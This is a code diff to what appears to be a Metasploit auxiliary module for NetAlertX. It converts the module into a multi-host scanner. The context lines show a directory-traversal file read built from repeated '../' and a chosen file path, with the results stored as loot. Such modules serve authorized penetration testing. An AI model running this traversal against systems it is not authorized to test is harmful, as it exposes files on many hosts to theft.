@@ -2,6 +2,7 @@ class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
+  include Msf::Auxiliary::Scanner
   prepend Msf::Exploit::Remote::AutoCheck
 
   def initialize(info = {})
@@ -58,7 +59,7 @@ class MetasploitModule < Msf::Auxiliary
     Exploit::CheckCode::Appears("Version #{version} detected.")
   end
 
-  def run
+  def run_host(ip)
     traversal = '../' * datastore['DEPTH']
     filepath = datastore['FILEPATH']
     dummyfilename = Rex::Text.rand_text_alphanumeric(6)
@@ -90,7 +91,7 @@ class MetasploitModule < Msf::Auxiliary
     loot_path = store_loot(
       'netalert.results',
       'text/plain',
-      datastore['rhosts'],
+      ip,
       log_data.text,
       "netalert-#{filepath}.txt",
       'NetAlertX'
